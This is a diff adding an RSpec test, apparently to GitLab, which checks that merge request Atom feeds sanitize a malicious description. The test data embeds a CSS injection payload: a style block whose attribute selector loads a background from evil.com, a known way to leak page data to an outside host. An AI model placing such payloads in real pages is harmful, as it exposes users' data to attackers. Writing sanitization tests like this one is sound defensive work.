@@ -90,6 +90,25 @@ RSpec.describe 'Merge Requests Feed', feature_category: :devops_reports do
         it_behaves_like 'an authenticated merge request atom feed'
       end
     end
+
+    context 'with potentially malicious description' do
+      let_it_be(:malicious_mr) do
+        create(:merge_request,
+          source_project: project,
+          source_branch: 'fix',
+          assignees: [assignee],
+          description: "<style>*[href^=\"a\"]{background:url(//evil.com/a)}</style>\n\n**Legitimate text**"
+        )
+      end
+
+      let_it_be(:issuable) { malicious_mr }
+
+      before do
+        visit project_merge_requests_path(project, :atom, feed_token: user.feed_token)
+      end
+
+      it_behaves_like 'a sanitized issuable atom feed'
+    end
   end
 
   describe 'GET /groups/:group/-/merge_requests' do
